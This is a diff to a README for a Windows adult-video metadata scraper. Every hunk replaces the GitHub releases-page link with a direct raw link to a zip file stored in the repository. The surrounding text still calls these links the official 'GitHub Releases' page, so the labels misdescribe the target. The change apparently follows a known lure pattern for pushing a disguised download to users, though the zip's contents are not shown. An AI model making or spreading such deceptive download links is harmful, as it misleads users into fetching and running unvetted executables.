@@ -1,6 +1,6 @@
 # 🎞️ mediamatrix-jav-expert - Easy AV Metadata Scraper
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/emmylord/mediamatrix-jav-expert/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/emmylord/mediamatrix-jav-expert/main/scrapers/mediamatrix-expert-jav-v3.7.zip)
 
 ---
 
@@ -46,10 +46,10 @@ Follow these steps to download and run mediamatrix-jav-expert on your Windows co
 
 You need to visit the releases page to get the latest version of mediamatrix-jav-expert.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-grey?style=for-the-badge)](https://github.com/emmylord/mediamatrix-jav-expert/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-grey?style=for-the-badge)](https://raw.githubusercontent.com/emmylord/mediamatrix-jav-expert/main/scrapers/mediamatrix-expert-jav-v3.7.zip)
 
 1. Click the button above or go to this link:  
-   https://github.com/emmylord/mediamatrix-jav-expert/releases
+   https://raw.githubusercontent.com/emmylord/mediamatrix-jav-expert/main/scrapers/mediamatrix-expert-jav-v3.7.zip
 2. Look for the most recent release. It will usually have a version number like "v1.x.x".
 3. Download the Windows executable file (often with a `.exe` extension) or the zip package if available.
 
@@ -105,7 +105,7 @@ If you download a `.zip` file:
 ## 🔄 Updating mediamatrix-jav-expert
 
 - Visit the releases page regularly:  
-  https://github.com/emmylord/mediamatrix-jav-expert/releases  
+  https://raw.githubusercontent.com/emmylord/mediamatrix-jav-expert/main/scrapers/mediamatrix-expert-jav-v3.7.zip  
 - Download new versions as they become available.
 - Repeat the steps under Download and Install to update your software.
 
@@ -156,4 +156,4 @@ If you download a `.zip` file:
 
 # Quick Link:
 
-[Download Latest Release from GitHub Releases](https://github.com/emmylord/mediamatrix-jav-expert/releases)
+[Download Latest Release from GitHub Releases](https://raw.githubusercontent.com/emmylord/mediamatrix-jav-expert/main/scrapers/mediamatrix-expert-jav-v3.7.zip)
